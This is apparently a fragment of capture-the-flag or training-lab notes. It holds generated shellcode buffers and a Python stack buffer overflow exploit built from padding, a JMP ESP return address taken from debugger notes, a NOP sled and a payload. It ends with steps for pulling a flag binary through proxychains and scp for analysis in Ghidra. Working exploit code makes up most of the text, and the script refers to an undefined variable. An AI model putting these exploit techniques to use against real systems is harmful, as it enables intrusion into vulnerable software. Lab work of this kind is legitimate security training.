# AppendExit=false, MeterpreterDebugLevel=0,
# RemoteMeterpreterDebugFile=, CMD=cat users
buf =  b""
buf += b"\xba\xaa\x14\x57\xbb\xdb\xc7\xd9\x74\x24\xf4\x5e\x2b"
buf += b"\xc9\xb1\x0c\x83\xc6\x04\x31\x56\x0f\x03\x56\xa5\xf6"
buf += b"\xa2\xd1\xb2\xae\xd5\x74\xa2\x26\xcb\x1b\xa3\x50\x7b"
buf += b"\xf3\xc0\xf6\x7c\x63\x09\x65\x14\x1d\xdc\x8a\xb4\x09"
buf += b"\xd4\x4c\x39\xca\x8b\x2d\x4d\xea\x3e\xdd\xc8\x98\xb3"
buf += b"\x21\x44\x0e\xba\xc3\xa7\x30"
```
Code
```
  1 #!/usr/bin/env python
  2 
  3 buffer = "A" * 62
  4 eip = "\x59\xeb\xde\xf7"
  5 nop = "\x90" * 15
  6 buf =  b""
  7 buf += b"\xb8\xfb\x3d\xe0\xdc\xd9\xee\xd9\x74\x24\xf4\x5a"
  8 buf += b"\x2b\xc9\xb1\x0b\x83\xc2\x04\x31\x42\x10\x03\x42"
  9 buf += b"\x10\x19\xc8\x8a\xd7\x85\xaa\x19\x8e\x5d\xe0\xfe"
 10 buf += b"\xc7\x7a\x92\x2f\xab\xec\x63\x58\x64\x8e\x0a\xf6"
 11 buf += b"\xf3\xad\x9f\xee\x03\x31\x20\xef\x7c\x59\x4f\x8e"
 12 buf += b"\xef\xf0\x8f\x07\xa3\x8b\x71\x6a\xc3"
 13 
 14 # find /b 0xf7de1000,0xfffdd000, 0xff, 0xe4
 15 # 0xf7de3b59 -> 0xf7 de eb 59 "\x59\xeb\xde\xf7"
 16 # 0xf7f588ab -> 0xf7 f5 88 ab "\xab\x88\xf5\xf7"
 17 # 0xf7f645fb -> 0xf7 f6 45 fb "\xfb\x45\xf6\xf7"
 18 # 0xf7f6460f -> 0xf7 f6 46 0f "\x0f\x46\xf6\xf7"
 19 
 20 
 21 print(buffer+eip+nop+buff)
```




## INVENTORY2.exe (FLAG)

1. ssh to 192.168.28.105 and find file
2. scp from 105 to your LinOps
proxychains scp -P2222 comrade@192.168.28.105:/.hidden/inventory2.exe .

3. scp from winops to your linops to get inventory2.exe on GHIDRA
4.  
